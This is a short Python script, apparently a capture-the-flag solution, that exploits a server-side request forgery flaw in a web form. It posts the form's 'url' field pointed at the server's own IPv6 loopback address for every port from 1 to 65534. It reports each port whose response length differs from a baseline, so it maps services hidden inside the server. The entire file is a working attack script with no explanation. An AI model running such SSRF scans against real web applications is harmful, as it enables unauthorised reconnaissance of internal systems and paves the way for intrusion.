#!/usr/bin/python3

import requests

url = "http://host1.metaproblems.com:5730/index.php"
headers = {
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Referer": "http://host1.metaproblems.com:5730/index.php",
"Content-Type": "multipart/form-data; boundary=---------------------------36509708214041892871906049011",
"Connection": "close",
"Upgrade-Insecure-Requests": "1"
}


for i in range(1,65535):
	port = str(i)
	data = "-----------------------------36509708214041892871906049011\r\nContent-Disposition: form-data; name=\"url\"\r\n\r\nhttp://[::1]:%s\r\n-----------------------------36509708214041892871906049011--\r\n" % port
	r = requests.post(url, headers=headers, data=data)
	if len(r.text) != 445:
		print("Found port: " + str(i))
